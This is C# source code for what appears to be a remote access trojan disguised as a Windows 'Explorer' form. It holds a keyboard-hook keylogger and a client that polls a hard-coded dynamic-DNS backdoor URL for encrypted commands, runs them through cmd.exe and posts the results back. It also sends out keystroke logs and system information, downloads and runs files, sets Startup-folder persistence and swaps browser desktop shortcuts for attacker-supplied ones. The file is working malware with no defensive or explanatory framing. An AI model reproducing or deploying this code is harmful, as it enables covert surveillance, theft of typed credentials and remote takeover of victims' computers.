using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;


namespace Explorer
{
    public partial class explorer : Form
    {
        public explorer()
        {
            InitializeComponent();
            Client.Listener.HandleListener();
        }

        private void Explorer_Load(object sender, EventArgs e)
        {

        }
    }
    namespace Keylogger
    {
        public class Program
        {
            
            public static int WH_KEYBOARD_LL = 13;
            public static int WM_KEYDOWN = 0x0100;
            public static IntPtr hook = IntPtr.Zero;
            public static LowLevelKeyboardProc llkProcedure = HookCallback;

            public static void Principal(string[] args)
            {
                hook = SetHook(llkProcedure);
                Application.Run();
                UnhookWindowsHookEx(hook);
            }
            public static void start_log()
            {
                Principal(null);
            }

            public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
            public static string textv = "";
            public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    //Console.Out.WriteLine(lParam);
                    //Console.ReadKey();
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (((Keys)vkCode).ToString() == "OemPeriod")
                    {
                        //Console.Out.Write(".");
                        StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                        output.Write(".");
                        output.Close();
                    }
                    else if (((Keys)vkCode).ToString() == "Oemcomma")
                    {
                        //Console.Out.Write(",");
                        StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                        output.Write(",");
                        output.Close();
                    }
                    else if (((Keys)vkCode).ToString() == "Space")
                    {
                        //Console.Out.Write(" ");
                        StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                        output.Write(" ");
                        output.Close();
                    }
                    else
                    {
                        //Console.Out.Write((Keys)vkCode);
                        StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                        output.Write((Keys)vkCode + "_");
                        output.Close();
                        textv += (Keys)vkCode + "-";
                    }

                }
                return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
            }
         
            public static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                Process currentProcess = Process.GetCurrentProcess();
                ProcessModule currentModule = currentProcess.MainModule;
                String moduleName = currentModule.ModuleName;
                IntPtr moduleHandle = GetModuleHandle(moduleName);
                return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
            }

            [DllImport("user32.dll")]
            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll")]
            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll")]
            public static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetModuleHandle(String lpModuleName);
        }
    }
    namespace Client
    {
        static class Listener
        {
            #region Variables
            private const int _Version = 126;
            static int vzs = 0;
            static readonly string host = "hagash.ddns.net";
            static readonly string port = "160";
            static readonly string URL = $"http://{host}:{port}/backdoor/backshell.php";
            static readonly string URLd = $"http://{host}:{port}/backdoor/";
            static string last_cmd = "";
            static object objResponse = "";
            #endregion
            public static async void HandleListener()
            {
                ExecutarCMD("TASKKILL /IM cmd.exe",true);
                CheckWebServer();
                if( !CheckVersion() )
                {
                    Update();
                    return;
                }
                Thread keylogger = new Thread(Keylogger.Program.start_log);
                keylogger.Start();
                WarnAlive();
                Start_persistence();
                while (true)
                {
                    await Task.Delay(400);
                    Check_host();
                }
            }

            static void CheckWebServer()
            {
                while (true)
                {
                    try
                    {
                        var WebREQ = WebRequest.CreateHttp(URL + "?Version");
                        WebREQ.Method = "GET";
                        WebREQ.UserAgent = "RequisicaoWebDemo";
                        var streamDados = WebREQ.GetResponse().GetResponseStream();
                        StreamReader reader = new StreamReader(streamDados);
                        objResponse = reader.ReadToEnd();
                        return;
                    }
                    catch {  }
                }
            }

            static void Update( bool _end = false )
            {
                string[] fpath = Application.UserAppDataPath.ToString().Split(@"\".ToCharArray()[0]);
                string AppData = fpath[0] + fpath[1].Insert(0, @"\") + fpath[2].Insert(0, @"\") + fpath[3].Insert(0, @"\") + fpath[4].Insert(0, @"\");
                string loc = AppData + @"\Microsoft\Windows\Start Menu\Programs\Startup\";
                ExecutarCMD("del " + loc + "Explorer.exe", true);
                ExecutarCMD(@"del C:\temp\Updater.bat", true);
                WebClient webClient = new WebClient();
                string exe_ = "_Explorer.exe";
                webClient.DownloadFile(new Uri(URLd + exe_), loc + exe_);
                webClient.DownloadFile(new Uri(URLd + "Updater.bat"), @"C:\temp\Updater.bat");
                //Alert("Clique em OK para continuar com a atualização de sistema.");
                using (Process processo = new Process())
                {
                    processo.StartInfo.FileName = Environment.GetEnvironmentVariable("comspec");
                    processo.StartInfo.Arguments = string.Format("/c {0}", @"C:\temp\Updater.bat");
                    processo.StartInfo.CreateNoWindow = true;
                    processo.Start();
                }
                Environment.Exit(0);
            }

            static bool CheckVersion()
            {
                var WebREQ = WebRequest.CreateHttp(URL + "?Version");
                WebREQ.Method = "GET";
                WebREQ.UserAgent = "RequisicaoWebDemo";
                var streamDados = WebREQ.GetResponse().GetResponseStream();
                StreamReader reader = new StreamReader(streamDados);
                objResponse = reader.ReadToEnd();
                return  ( Convert.ToInt32( objResponse.ToString() ) == _Version ) ?  true : false;
            }

            public static void Start_persistence()
            {
                string path = Directory.GetCurrentDirectory().ToString();
                var leq = Directory.GetFiles(path);
                int x = 0;
                while (x != leq.Length - 1)
                {
                    if (leq[x].ToString().ToLower().Contains(".exe"))
                    {
                        string file = leq[x].ToString().Trim();
                        string loc = " %appdata%" + @"\Microsoft\Windows\&Start Menu&\Programs\Startup\".Replace('&', '"');
                        ExecutarCMD("copy " + '"' + file + '"' + loc , true);
                    }
                    x++;
                }
                App_persistence("chrome", "edge");
            }
            public static void App_persistence(string app, string variant)
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var items = Directory.GetFiles(desktop);
                int x = 0;
                WebClient webClient = new WebClient();
                while (x != items.Length - 1)
                {
                    if (items[x].ToString().ToLower().Contains(app) || items[x].ToString().ToLower().Contains(variant))
                    {
                        string file = items[x].ToString().Trim();
                        ExecutarCMD("del " + '"' + file + '"' , true);
                        webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(comp);
                        string[] archive_name = file.Split('.')[0].Replace(@"\""".ToCharArray()[0], '/').Split('/');
                        string name = archive_name[archive_name.Length - 1];
                        webClient.DownloadFileAsync(new Uri(URLd + app + ".lnk"), desktop + @"\" + name + ".lnk");
                    }
                    x++;
                }

            }
            static void comp(object sender, AsyncCompletedEventArgs e) { //Alert("fully"); 
            }
            public static string Decrypter(string hash)
            {
                string alphabet = "abcdefghijklmnopqrstuvwxyz";
                string[] alpha_encoded =
                    { "a9", "f5", "a0", "e6", "97", "d6", "8e", "c5", "83", "b4", "78", "a2", "6b", "8f", "5e", "7b", "51", "66", "42",
                "3a", "33", "3b", "22", "24", "11", "c", };
                string[] alpha_encoded_lower =
                    { "fc", "a5", "ed", "9c", "de", "93", "ce", "88", "bd", "7d", "ab", "72", "98", "65", "85", "58", "71", "49", "5c",
                "3a", "46", "2b", "2f", "1a", "18", "9" };
                #region comments
                // OUTPUT MODELS: 
                //      x(a9) = Letras minusculas
                // [%+-@](a9) = Letras maiusculas
                // [$#?!](ac) = Chars especiais
                // #(ac_#(5e_#(59_
                #endregion
                string[] encoded_comb = { };
                try { encoded_comb = hash.Split('_'); }
                catch (Exception e) { }
                string decrypt_value = "";
                string id_comb = "";
                foreach (String comb in encoded_comb)
                {
                    try { id_comb = comb.Split('(')[0]; }
                    catch (Exception e) { }
                    if (id_comb.Length == 0)
                    {
                        break;
                    }
                    string encoded_char = "";
                    try { encoded_char = comb.Split('(')[1]; } catch (Exception) { }
                    switch (id_comb)
                    {
                        case "#":
                        case "~":
                        case "|":
                        case "!":
                            try
                            {
                                double decValue = Convert.ToUInt64(encoded_char, 16);
                                double equation = decValue / 2.7;
                                double code = Math.Round(equation);
                                char c = Convert.ToChar((int)code);
                                decrypt_value += c;
                            }
                            catch (Exception parseError) { }
                            //double decValue = Double.Parse(encoded_char, System.Globalization.NumberStyles.HexNumber);

                            break;
                        case "%":
                        case "+":
                        case "-":
                        case "@":
                            try
                            {
                                int code_get = Array.IndexOf(alpha_encoded, encoded_char);
                                if (code_get == -1)
                                {
                                    code_get = Array.IndexOf(alpha_encoded_lower, encoded_char);
                                }
                                char char_eq = alphabet[code_get];
                                decrypt_value += char_eq.ToString().ToLower();
                            }
                            catch (Exception parseError) { }
                            break;
                        default:
                            try
                            {
                                int code_x = Array.IndexOf(alpha_encoded, encoded_char);
                                if (code_x == -1)
                                {
                                    code_x = Array.IndexOf(alpha_encoded_lower, encoded_char);
                                }
                                char char_x = alphabet[code_x];
                                decrypt_value += char_x.ToString().ToUpper();
                            }
                            catch (Exception parseError)
                            { //alert("Houve um erro ao tentar decifrar este conjunto!#P06"); 
                            }

                            break;
                    }
                }
                return decrypt_value;
            }
            public static string Encrypter(string hash)
            {
                string alphabet = "abcdefghijklmnopqrstuvwxyz";
                char[] upperl = { '%', '+', '-', '@' };
                char[] upperE = { '~', '#', '|', '!', };
                int x = 0;
                string cifrada = "";
                string letter = "";
                Random rnd = new Random();
                foreach (char c in hash)
                {
                    int rnM = rnd.Next(0, alphabet.Length - 1);
                    int rnm = rnd.Next(0, upperl.Length - 1);
                    int rnE = rnd.Next(0, upperE.Length - 1);

                    if (Convert.ToInt32(c) < 97 && alphabet.Contains(c.ToString().ToLower()))
                    {
                        letter = alphabet.ToCharArray()[rnM].ToString();
                    }
                    else if (!alphabet.Contains(c.ToString().ToLower()))
                    {
                        letter = upperE[rnE].ToString();
                    }
                    else
                    {
                        letter = upperl[rnm].ToString().ToLower();
                    }
                    if (x % 2 == 0 || c.ToString().ToLower() == "t")
                    {
                        int index_rev = 26 - alphabet.IndexOf(c.ToString().ToLower());
                        double cif = (index_rev * Convert.ToInt32(c.ToString().ToUpper().ToCharArray()[0])) / 10;
                        string hex = ((int)cif).ToString("x") + "";
                        cifrada += letter + "(" + hex + "_";
                    }
                    else
                    {
                        int index_rev = 26 - alphabet.IndexOf(c.ToString().ToLower());
                        double cif = (index_rev * Convert.ToInt32(c.ToString().ToLower().ToCharArray()[0])) / 10;
                        cif = Math.Ceiling(cif);
                        string hex = ((int)cif).ToString("x") + "";
                        cifrada += letter + "(" + hex + "_";
                    }
                    x++;
                }
                return cifrada;
            }
            public static string Terminal(string cmd)
            {
                using (Process processo = new Process())
                {
                    processo.StartInfo.FileName = Environment.GetEnvironmentVariable("comspec");
                    processo.StartInfo.Arguments = string.Format("/c {0}", cmd);
                    processo.StartInfo.RedirectStandardOutput = true;
                    processo.StartInfo.UseShellExecute = false;
                    processo.StartInfo.CreateNoWindow = false;
                    processo.Start();
                    processo.WaitForExit(5500);
                    try
                    {
                        Process p = Process.GetProcessById(processo.Id);
                        p.Kill();
                    }
                    catch (Exception x) { }
                    string ret = processo.StandardOutput.ReadToEnd();
                    return ret;
                }
            }
            public static string Tasker()
            {
                using (Process processo = new Process())
                {
                    processo.StartInfo.FileName = Environment.GetEnvironmentVariable("comspec");
                    processo.StartInfo.Arguments = string.Format("/c {0}", "tasklist");
                    processo.StartInfo.RedirectStandardOutput = true;
                    processo.StartInfo.UseShellExecute = false;
                    processo.StartInfo.CreateNoWindow = true;
                    processo.Start();
                    processo.WaitForExit(1500);
                    Process p = Process.GetProcessById(processo.Id);
                    try
                    {
                        p.Kill();
                    }
                    catch (Exception x) { }
                    string ret = processo.StandardOutput.ReadToEnd();
                    return "$_RET/TASKER=" + ret;
                }
            }
            public static string Messager(string text, string title, int btnx, int iconx)
            {
                MessageBoxButtons btn = MessageBoxButtons.OK;
                MessageBoxIcon icon = MessageBoxIcon.Information;
                switch (btnx)
                {
                    case 0:
                        btn = MessageBoxButtons.OK;
                        break;
                    case 1:
                        btn = MessageBoxButtons.YesNo;
                        break;
                    case 2:
                        btn = MessageBoxButtons.YesNoCancel;
                        break;
                    case 3:
                        btn = MessageBoxButtons.OKCancel;
                        break;
                    case 4:
                        btn = MessageBoxButtons.RetryCancel;
                        break;
                    case 5:
                        btn = MessageBoxButtons.AbortRetryIgnore;
                        break;
                    default:
                        break;
                }
                switch (iconx)
                {
                    case 0:
                        icon = MessageBoxIcon.Error;
                        break;
                    case 1:
                        icon = MessageBoxIcon.Information;
                        break;
                    case 2:
                        icon = MessageBoxIcon.Warning;
                        break;
                    case 3:
                        icon = MessageBoxIcon.Exclamation;
                        break;
                    case 4:
                        icon = MessageBoxIcon.Question;
                        break;
                    case 5:
                        icon = MessageBoxIcon.Asterisk;
                        break;
                    case 6:
                        icon = MessageBoxIcon.Hand;
                        break;
                    case 7:
                        icon = MessageBoxIcon.Stop;
                        break;
                    case 8:
                        icon = MessageBoxIcon.None;
                        break;
                    default:
                        break;
                }
                DialogResult msg = MessageBox.Show(text, title, btn, icon);
                return "$_RET/MSG=Text box enviado com sucesso a vitima !";
            }
            [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
            public static extern int SystemParametersInfo(UAction uAction, int uParam, StringBuilder lpvParam, int fuWinIni);
            public enum UAction
            {
                SPI_SETDESKWALLPAPER = 0x0014,
                SPI_GETDESKWALLPAPER = 0x0073,
            }
            public static int SetBackgroud(string fileName)
            {
                int result = 0;
                if (File.Exists(fileName))
                {
                    StringBuilder s = new StringBuilder(fileName);
                    result = SystemParametersInfo(UAction.SPI_SETDESKWALLPAPER, 0, s, 0x2);
                }
                return result;
            }
            public static string Web_Downloader(string link , string path = @"c:\temp\")
            {
                WebClient webClient = new WebClient();
                string exe_ = link.Split('_')[0];
                link = link.Split('_')[1];
                webClient.DownloadFile(new Uri(link), path + exe_);
                return "Download completo!\nDiretorio local: " + path + exe_;
            }
            public static async void Player(string music_path)
            {
                await Task.Delay(2000);
                if(!File.Exists(@"C:\temp\" + music_path))
                {
                    vzs++;
                    if(vzs != 6)
                    {
                        Player(music_path);
                    }
                    return;
                }
                Terminal(music_path);
                vzs = 0;
            }
            public static string Play_Music(string music_link)
            {
                string msg="";
                try
                {
                    string music_name = music_link.Split('_')[0];
                    music_link = music_link.Split('_')[1];
                    WebClient wc = new WebClient();
                    //Alert("link["+music_link);
                    wc.DownloadFile(new Uri(music_link.Replace('{', ':')), @"c:\temp\" + music_name);
                    Player(music_name);
                    msg = "Musica em execução!";
                }catch(Exception v) { msg = "Erro: " + v.Message; }

                return "$_RET/ALERT="+msg;
            }
            public static string F_0x866(string cmd)
            {
                switch (cmd.ToUpper().Split('=')[0])
                {
                    case "$_TASKER":
                        return Tasker();
                    case "$_MSGBOX":
                        string[] data = cmd.Split('=')[1].Split('-');
                        return Messager(data[0], data[1], int.Parse(data[2]), int.Parse(data[3]));
                    case "$_INFO":
                        return "$_RET/INFO=" + Terminal("systeminfo");
                    case "$_VARS":
                        return "$_RET/VARS=" + Terminal("SET").Replace("=", " > ");
                    case "$_MSC":
                        string url = cmd.Split('=')[1];
                        return Play_Music(url);
                    case "$_KBSPY":
                        string read = new StreamReader(@"C:\ProgramData\mylog.txt").ReadToEnd();
                        return "$_RET/KBSPY=" + read;
                    case "$_BG":
                        return SetBackgroud(@"C:\temp\" + cmd.Split('=')[1]).ToString();
                    case "$_DIR":
                        string path = cmd.Split('=')[1].Replace('{', ':').Replace('}', '\'') ;
                        string cmd_line = "$_RET/DIR=" + Terminal("echo " + path +" & echo ../ & DIR /B " + '"' + path + '"');
                        return cmd_line;
                    case "$_DIRS":
                        return "$_RET/DIRS="+ Terminal("echo %cd%") + "../\n" + Terminal("DIR /B");
                    case "$_DWL":
                        return Web_Downloader(cmd.Split('=')[1].Replace('{',':').Replace('}','='));
                    default:
                        //Alert("erro: " + cmd);
                        return "";
                }
            }
            public static void Set_POST(string url, string key, string data)
            {

                string dadosPOST = (key + data);
                var requisicaoWeb = WebRequest.CreateHttp(url);
                requisicaoWeb.Method = "POST";
                requisicaoWeb.ContentType = "application/x-www-form-urlencoded";
                var dados = Encoding.UTF8.GetBytes(dadosPOST);
                requisicaoWeb.ContentLength = dados.Length;
                try
                {
                    using (var stream = requisicaoWeb.GetRequestStream())
                    {
                        stream.Write(dados, 0, dados.Length);
                        stream.Close();
                    }
                    requisicaoWeb.UserAgent = "RequisicaoWebDemo";
                    requisicaoWeb.GetResponse().GetResponseStream();
                }
                catch (Exception)
                {
                    //Alert("Não foi possivel estabelecer uma conexão segura com servidor remoto !");
                }

            }
            public static void WarnAlive()
            {
                string url = "http://checkip.dyndns.org";
                WebRequest req = WebRequest.Create(url);
                WebResponse resp = req.GetResponse();
                StreamReader sr = new StreamReader(resp.GetResponseStream());
                string response = sr.ReadToEnd().Trim();
                string[] a = response.Split(':');
                string a2 = a[1].Substring(1);
                string[] a3 = a2.Split('<');
                string ip = a3[0];
                string ID_Machine = Encrypter(ip + ":" + Environment.MachineName);
                //Alert("ID: " + ID_Machine.Replace('?','!') + "\nDec:" + Decrypter(ID_Machine));
                Set_POST(URL, "new_alive=", ID_Machine);
            }
            public static void Alert(string msg, string cap = "Alerta", MessageBoxIcon ico = MessageBoxIcon.Information, MessageBoxButtons btn = MessageBoxButtons.OK)
            {
                MessageBox.Show(msg, cap, btn, ico);
            }
            public static string ExecutarCMD(string comando, bool noWindow = false )
            {
                last_cmd = comando;
                if (comando.Contains("$_"))
                {
                    return F_0x866(comando);
                }
                using (Process processo = new Process())
                {
                    ProcessStartInfo info = processo.StartInfo;
                    info.FileName = Environment.GetEnvironmentVariable("comspec");
                    info.Arguments = string.Format("/c MODE CON:COLS=15 & MODE CON:LINES=1 & title=aplicando alterações... & {0}", comando.Replace('}','.').Replace('{',':'));
                    //info.Verb = "runas";
                    info.RedirectStandardOutput = true;
                    info.UseShellExecute = false;
                    info.CreateNoWindow = noWindow;
                    info.RedirectStandardError = true;
                    info.RedirectStandardInput = true;
                    info.WindowStyle = ProcessWindowStyle.Minimized;
                    processo.Start();
                    processo.WaitForExit(8000);
                    string ret = "";
                    processo.StandardInput.Close();
                    processo.StandardError.Close();
                    if (processo.HasExited)
                    {
                        ret = "[ " + processo.ExitCode + " ] => " + processo.StandardOutput.ReadToEnd();
                        if (processo.ExitCode.ToString() != "0")
                        {
                            try
                            {
                                ret += processo.StandardError.ReadToEnd();

                            }
                            catch (Exception) { }
                        }
                    }
                    else
                    {
                        try
                        {
                            Process p = Process.GetProcessById(processo.Id);
                            p.Kill();
                            if (!processo.HasExited)
                            {
                                foreach (Process proc in Process.GetProcessesByName(processo.ProcessName))
                                {
                                    proc.Kill();
                                }
                            }
                        }
                        catch (Exception e) { }
                        if (!processo.StandardOutput.EndOfStream)
                        {
                            processo.StandardOutput.Close();
                            ret = "[ COMMAND TIME OUT ! ] => ";
                        }
                        else
                        {
                            ret = "[ TimeOut ]" + processo.StandardOutput.ReadToEnd();
                        }
                    }
                    try
                    {
                        processo.Kill();
                        processo.Dispose();
                        processo.Close();
                        processo.CloseMainWindow();
                    }
                    catch (Exception)
                    {

                    }
                    return ret;
                }
            }
            public static void Check_host()
            {
                try
                {
                    var requisicaoWeb = WebRequest.CreateHttp(URL + "?get_cmd");
                    requisicaoWeb.Method = "GET";
                    requisicaoWeb.UserAgent = "RequisicaoWebDemo";
                    var streamDados = requisicaoWeb.GetResponse().GetResponseStream();
                    StreamReader reader = new StreamReader(streamDados);
                    objResponse = reader.ReadToEnd();
                    objResponse = Decrypter(objResponse.ToString());
                }
                catch (Exception error) { }
                if (objResponse.ToString().Length > 3)
                {
                    if (!objResponse.ToString().Contains(Environment.MachineName))
                    {
                        return;
                    }
                    string[] cmds = objResponse.ToString().Split(':');
                    int vars = 0;
                    int local = 0;
                    while (vars != cmds.Length)
                    {
                        if (cmds[vars] == Environment.MachineName)
                        {
                            local = vars + 1;
                            vars = cmds.Length - 1;
                        }
                        vars++;
                    }
                    if (last_cmd.ToLower() == cmds[local].ToLower())
                    {
                        return;
                    }
                    //Alert("Executando: " + cmds[local].ToString().ToLower() + ".");
                    string saida = ExecutarCMD(cmds[local].ToString().ToLower());
                    string data = (Environment.MachineName + ":@" + saida.Replace(':', '^') + "@").Replace('@', '"');
                    Set_POST(URL, "set_out=", Encrypter(data));
                }
            }

        }
    }
}

